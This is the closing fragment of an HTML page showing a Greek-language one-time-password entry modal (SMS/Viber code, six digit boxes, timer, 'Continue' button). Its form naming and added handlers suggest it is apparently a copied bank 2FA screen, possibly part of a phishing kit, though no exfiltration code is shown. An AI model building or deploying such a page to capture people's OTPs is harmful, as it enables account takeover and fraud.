                                                   <div class="mat-form-field-hint-wrapper ng-tns-c0-2 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                      <!---->
                                                      <div class="mat-form-field-hint-spacer"></div>
                                                   </div>
                                                </div>
                                             </div>
                                          </mat-form-field>
                                          <mat-form-field class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-3 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                             <div class="mat-form-field-wrapper">
                                                <div class="mat-form-field-flex">
                                                   <!----><!---->
                                                   <div class="mat-form-field-infix">
                                                      <input class="text-align-center mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored" matinput="" maxlength="1" type="tel" id="digit-4" aria-invalid="false" aria-required="false" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="forth" size=1 autocomplete="fname" onKeyup="autotab(this, document.sampleform.fifth)" required>
                                                      <span class="mat-form-field-label-wrapper">
                                                         <!---->
                                                      </span>
                                                   </div>
                                                   <!---->
                                                </div>
                                                <!---->
                                                <div class="mat-form-field-underline ng-tns-c0-3 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                <div class="mat-form-field-subscript-wrapper">
                                                   <!----><!---->
                                                   <div class="mat-form-field-hint-wrapper ng-tns-c0-3 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                      <!---->
                                                      <div class="mat-form-field-hint-spacer"></div>
                                                   </div>
                                                </div>
                                             </div>
                                          </mat-form-field>
                                          <mat-form-field class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-4 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                             <div class="mat-form-field-wrapper">
                                                <div class="mat-form-field-flex">
                                                   <!----><!---->
                                                   <div class="mat-form-field-infix">
                                                      <input class="text-align-center mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored" matinput="" maxlength="1" type="tel" id="digit-5" aria-invalid="false" aria-required="false" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="fifth" size=1 onKeyup="autotab(this, document.sampleform.sixth)" autocomplete="fname" required>
                                                      <span class="mat-form-field-label-wrapper">
                                                         <!---->
                                                      </span>
                                                   </div>
                                                   <!---->
                                                </div>
                                                <!---->
                                                <div class="mat-form-field-underline ng-tns-c0-4 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                <div class="mat-form-field-subscript-wrapper">
                                                   <!----><!---->
                                                   <div class="mat-form-field-hint-wrapper ng-tns-c0-4 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                      <!---->
                                                      <div class="mat-form-field-hint-spacer"></div>
                                                   </div>
                                                </div>
                                             </div>
                                          </mat-form-field>
                                          <mat-form-field class="modal-wrapper-complete-icon-margin mat-form-field ng-tns-c0-5 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-star-inserted" style="max-width: 1rem;">
                                             <div class="mat-form-field-wrapper">
                                                <div class="mat-form-field-flex">
                                                   <!----><!---->
                                                   <div class="mat-form-field-infix">
                                                      <input class="text-align-center mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored" matinput="" maxlength="1" type="tel" id="digit-6" aria-invalid="false" aria-required="false" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"  name="sixth" size=1 autocomplete="fname" required>
                                                      <span class="mat-form-field-label-wrapper">
                                                         <!---->
                                                      </span>
                                                   </div>
                                                   <!---->
                                                </div>
                                                <!---->
                                                <div class="mat-form-field-underline ng-tns-c0-5 ng-star-inserted"><span class="mat-form-field-ripple"></span></div>
                                                <div class="mat-form-field-subscript-wrapper">
                                                   <!----><!---->
                                                   <div class="mat-form-field-hint-wrapper ng-tns-c0-5 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity:1;transform:translateY(0%);0:opacity;1:transform;opacity:1;transform:translateY(0%);webkit-opacity:1;webkit-transform:translateY(0%);">
                                                      <!---->
                                                      <div class="mat-form-field-hint-spacer"></div>
                                                   </div>
                                                </div>
                                             </div>
                                          </mat-form-field>
                                       </div>
                                    </div>
                                    <!---->
                                    <div class="text-align-center ng-star-inserted" style="max-width: 16.5rem;">
                                       <!---->
                                       <div class="ng-star-inserted">
                                          <p class="text-x-small text-light text-light-black mat-title-margin-bottom">
                                             Συμπληρώστε το OTP που λάβατε μέσω SMS ή Viber στο κινητό <!----><span class="ng-star-inserted">+30********** </span>
                                          </p>
                                          <span class="text-large text-light text-light-black" id="time"> 02:00 </span>
                                       </div>
                                       <!---->
                                    </div>
                                 </div>
                              </i-code>
                           </div>
                       
                        </div>
                        <div class="footer-buttons-container">
                           <spinner type="action">
                              <!----><!----><button class="button margin-left-auto ng-star-inserted" type="submit" name="smss1" id="start_button" > Συνέχεια </button><!---->
                           </spinner>
                        </div>
                     </div>
                  </div>
                  </form>
               </two-fa-modal>
            </div>
         </div>
      </ngb-modal-window>
   </body>
</html>
